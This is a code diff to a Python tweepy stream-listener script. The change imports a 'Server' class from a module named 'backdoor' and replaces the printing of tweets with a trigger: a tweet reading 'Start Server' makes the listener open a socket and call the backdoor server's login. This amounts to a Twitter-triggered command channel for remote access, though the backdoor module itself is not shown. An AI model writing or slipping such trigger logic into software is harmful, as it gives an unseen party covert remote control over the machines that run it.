@@ -3,6 +3,8 @@ import tweepy
 from tweepy import StreamListener
 from tweepy import Stream
 from configparser import ConfigParser
+from backdoor import Server
+
 #Twitter
 """
 config = ConfigParser()
@@ -23,14 +25,23 @@ auth.set_access_token(ACCESS_TOKEN, ACCESS_SECRET)
 api = tweepy.API(auth)
 
 class CustomStreamListener(tweepy.StreamListener):
+	def __init__(self, message, server):
+		super(CustomStreamListener, self).__init__()
+		self.message = message
+		self.server = server
 	#Gets the message of the tweet
 	def on_status(self, status):
 		try:
 			twitter_message = str(status.extended_tweet["full_text"])
-			print(twitter_message)
+			if twitter_message == self.message:
+				socket = self.server.getSocket()
+				self.server.login(socket)
+
 		except AttributeError:
 			twitter_message = str(status.text)
-			print(twitter_message)
+			if twitter_message == self.message:
+				socket = self.server.getSocket()
+				self.server.login(socket)
 
 	def on_error(self, status_code):
 		if status_code == 420:
@@ -38,7 +49,8 @@ class CustomStreamListener(tweepy.StreamListener):
 
 def main():
 	user_id = str(api.me().id)
-	myStreamListener = CustomStreamListener()
+	customServer = Server()
+	myStreamListener = CustomStreamListener(message="Start Server", server = customServer)
 	myStream = tweepy.Stream(auth = api.auth, listener = myStreamListener)
 
 	print("Stream Listener Starting...")
